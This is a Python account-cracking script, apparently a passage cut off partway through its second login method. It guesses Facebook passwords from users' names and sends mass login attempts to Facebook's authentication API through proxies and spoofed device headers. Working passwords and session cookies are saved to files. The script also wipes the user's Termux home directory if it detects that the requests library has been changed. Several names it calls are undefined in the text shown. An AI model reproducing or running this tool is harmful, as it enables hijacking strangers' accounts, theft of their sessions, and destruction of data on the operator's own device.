# ~/ Developed By ~\ #
# ~/ JOKER REDHAT ~\ #

#import JOKER
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
from os import system as clr
os.system('clear')
os.system("pip uninstall requests chardet urllib3 idna certifi -y")
os.system("pip install chardet urllib3 idna certifi requests")
os.system('xdg-open https://www.facebook.com/duliako')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing Missing Modules...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python DOO.py')
except:pass
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2
# ~/ [ Proxies ]
os.system('rm -rf prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/mafiat2/M/main/prox.txt').text
    open('prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
# ~/\~
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()   
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
 
elif "sys.stdout.write" in x:	
    clr()
    shutil.rmtree("/data/data/com.termux/files/home")
else:
    pass           
# ~/ Date Converted
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 '
        elif uid[:9] in ['100000000']       :alif = ' \033[1;34m 2009 '
        elif uid[:8] in ['10000000']        :alif = ' \033[1;34m2009 '
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' \033[1;34m2009 '
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' \033[1;34m2010 '
        elif uid[:6] in ['100001']          :alif = ' \033[1;34m2010/2011 '
        elif uid[:6] in ['100002','100003'] :alif = ' \033[1;34m2011/2012 '
        elif uid[:6] in ['100004']          :alif = ' \033[1;34m2012/2013 '
        elif uid[:6] in ['100005','100006'] :alif = ' \033[1;34m2013/2014 '
        elif uid[:6] in ['100007','100008'] :alif = ' \033[1;34m2014/2015 '
        elif uid[:6] in ['100009']          :alif = ' \033[1;34m2015 '
        elif uid[:5] in ['10001']           :alif = ' \033[1;34m2015/2016 '
        elif uid[:5] in ['10002']           :alif = ' \033[1;34m2016/2017 '
        elif uid[:5] in ['10003']           :alif = ' \033[1;34m2018/2019 '
        elif uid[:5] in ['10004']           :alif = ' \033[1;34m2019/2020 '
        elif uid[:5] in ['10005']           :alif = ' \033[1;34m2020 '
        elif uid[:5] in ['10006','10007','']:alif = ' \033[1;34m2021 '
        elif uid[:5] in ['10008']           :alif = ' \033[1;34m2022 '
        elif uid[:5] in ['10009']           :alif = ' \033[1;34m2023 '
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' \033[1;34m2008/2009 '
    elif len(uid)==8:
        alif = ' \033[1;34m2007/2008 '
    elif len(uid)==7:
        alif = ' \033[1;34m2006/2007 '
    else:alif=''
    return alif
# ~/ User-Agent
def God():
	version=str(random.randint(5,14))
	code=str(random.randint(40,450))
	wid=str(random.randint(720,1280))
	heigh=str(random.randint(1280,2400))
	veer=str(random.randint(111111111,999999999))
	models=random.choice(["SM-P610N", "SM-P615", "SM-P610"])
	model2=random.choice(["RMX3740", "RMX3741"])
	model3=random.choice(["220333QAG", "220333QBI", "220333QNY", "220333QL"])
	model4=random.choice(["ASUS_Z017DB", "ASUS_Z017D", "ASUS_Z017DA", "ASUS_Z017DC", "ASUS_ZE520KL", "ASUS_ZA520KL"])
	facebook=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
	face=facebook.split("|") [1]
	face2=facebook.split("|") [0]
	ua1=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.22.104;FBPN/"+face2+";FBLC/id_ID;FBBV/"+veer+";FBCR/Vodafone India;FBMF/samsung;FBBD/samsung;FBDV/"+models+";FBSV/11.8.5;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,3))+".25,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua2=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.28.111;FBPN/"+face2+";FBLC/en_US;FBBV/"+veer+";FBCR/Cricket;FBMF/Realme;FBBD/Realme;FBDV/"+model2+";FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(2,4))+".75,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua3=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.12.120;FBPN/"+face2+";FBLC/en_GB;FBBV/"+veer+";FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBDV/"+model3+";FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,4))+".625,width="+wid+",height="+heigh+"};FB_FW/1;]"
	ua4=f"[FBAN/"+face+";FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/"+face+";FBAV/"+code+".0.0.32.114;FBPN/"+face2+";FBLC/it_IT;FBBV/"+veer+";FBCR/Airtel;FBMF/Asus;FBBD/Asus;FBDV/"+model4+";FBSV/7.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,3))+".0,width="+wid+",height="+heigh+"};FB_FW/1;]"
	return random.choice([ua1,ua2,ua3,ua4])
# ~/ Application Show
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'{P}Active Apps {H}&&{P} Web site Status not Connected')
    else:
        print(f'{H}Active Apps {O}&&{H} Web site Status')
        for i in range(len(game)):
            print(f"{P}[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'    %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'{N}Expired Apps {B}&&{N} Web site Status not Connected')
    else:
        print(f'{P}Expired Apps {B}&&{P} Web site Status')
        for i in range(len(game)):
            print(f"[%s%s]{B} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
# ~/\~
def p(x):
	print(x)
# ~/ [ Linked ]
os.system(f'xdg-open https://www.facebook.com/duliako')
sys.stdout.write('\x1b]2; ~[MR.JOKER]~\x07')
# ~/ [ Logo ]
logo=(f"""
\033[1;31m    ____   ____   ___    __ __________ ________    
\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
\033[1;31m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
\033[1;32m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_\033[1;32mVERSION.1.0.2
\033[1;37m═════════════════════════════════════════════════════
\033[1;37m ~/ Developer  >>  SHAHI JOKER
\033[1;37m ~/ GitHub     >>  HACKER JOKER
\033[1;37m ~/ Service    >>  Personal
\033[1;37m ~/ Working    >>  \033[1;32mWiFi \033[1;37m/ \033[1;36mData
\033[1;37m═════════════════════════════════════════════════════""")
# ~/ [ LineX ]
def linex():
    print('\033[1;37m═════════════════════════════════════════════════════')
# ~/ [ Clear ]
def clear():
        os.system('clear')
        print(logo)
# ~/ [ Indications ]
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]
# ~/ [ Menu ]
def menu():
                        clear()	
                        print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;37mFile Cracking ')
                        print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;37mUnblock Network IP')
                        print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;37mYouTube')
                        print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;37mTelegram')
                        print('\033[1;31m[\033[1;32m5\033[1;31m] \033[1;37mFollow Facebook')
                        print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;37mExit Programm ')
                        linex()
                        xd=input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mChoice an option : \033[1;32m')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mPut File Exp : \033[1;32m/sdcard/File.txt...')
                                linex()
                                file = input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mPut File path : \033[1;32m')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('')
                                linex()
                                print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;37mMethod 1 ')
                                print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;37mMethod 2 ')
                                print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;37mMethod 3 ')
                                linex()
                                mthd=input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mChoose : \033[1;32m')
                                linex()
                                plist = []
                                print("\033[1;31m[\033[1;32m1\033[1;31m] \033[1;37mAuto Password  ")                                
                                print("\033[1;31m[\033[1;32m2\033[1;31m] \033[1;37mManual Password ") 
                                linex()
                                psx=input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mChoose : \033[1;32m')
                                if psx in ['1','01']:
                                        plist.append('first123')
                                        plist.append('first@123')
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mPassword Limit ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mExp : \033[1;32mfirst last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;31m[\033[1;32m>>\033[1;31m] \033[1;37mPassword {i+1} : \033[1;32m'))
                                      
                                linex()
                                print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mDo you went show cp account ? \033[1;31m[\033[1;32mY/N\033[1;31m]\033[1;37m : \033[1;32m')
                                linex()
                                cx=input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mChoose : \033[1;32m')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=20) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mTOTAL FILE ACCOUNTS : \033[1;92m'+total_ids+f' ')
                                        print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mPROCESS START PLEASE WAIT...')
                                        print("\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mIF YOU NO RESULT \033[1;31m[\033[1;32mON\033[1;37m/\033[1;31mOFF\033[1;31m] \033[1;37mAIRPLANE MODE ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M3,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(M4,ids,names,passlist)
                                                         
                                print('\033[1;37m')
                                linex()
                                print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mThe Process has been completed')
                                print('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mTotal OK/CP : \033[1;32m'+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('\033[1;31m[\033[1;32m~\033[1;31m] \033[1;37mPress Enter to back ')
                                os.system('python DOO.py')
                        elif xd in ['2','02']:
                                createip()
                                exit()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        npxind()                              
                                else:
                                        menu()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/duliako')
                                menu()
                        elif xd in ['4','04']:
                                os.system('xdg-open https://www.facebook.com/duliako')
                                menu()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://www.facebook.com/duliako')
                                menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for used my tool♥ ')
                        else:
                                exit(' Option not found in menu...')
# ~/ [ Method - 1 ]
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-M1\033[1;31m]\033[1;37m\>\033[1;37m|\033[1;37m</\033[1;31m[\033[1;37m%s|\033[1;37mOK|\033[1;32m%s\033[1;31m]\033[1;37m\> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{{density={density}, width={width}, height={height}}};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type': 'application/x-www-form-urlencoded', 
                                        'Host': 'graph.facebook.com', 
                                        'x-fb-sim-hni': str(random.randint(2e4,4e4)), 
                                        'X-FB-Connection-Type': 'MOBILE.LTE', 
                                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni': str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120', 
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth': str(random.randint(2e7,3e7)), 
                                        'x-fb-connection-quality': 'EXCELLENT', 
                                        'X-FB-Client-IP': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'X-FB-Server-Cluster': 'True', 
                                        'x-fb-friendly-name': 'ViewerReactionsMutation', 
                                        'X-FB-Request-Analytics-Tags': 'graphservice', 
                                        'accept-encoding': 'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-OK\033[1;31m]\033[1;37m\> \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print("\033[1;37m </\033[1;31m[\033[1;36mCOOKIE\033[1;31m]\033[1;37m\> : \033[1;36m"+cookie)
                                        open('/sdcard/JOKER_M1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JOKER_M1_COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[JOKER-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
# ~/ [ Method - 2 ]
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m</\033[1;31m[\033[1;32mJOKER-M2\033[1;31m]\033[1;37m\>\033[1;37m|\033[1;37m</\033[1;31m[\033[1;37m%s|\033[1;37mOK|\033[1;32m%s\033[1;31m]\033[1;37m\> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
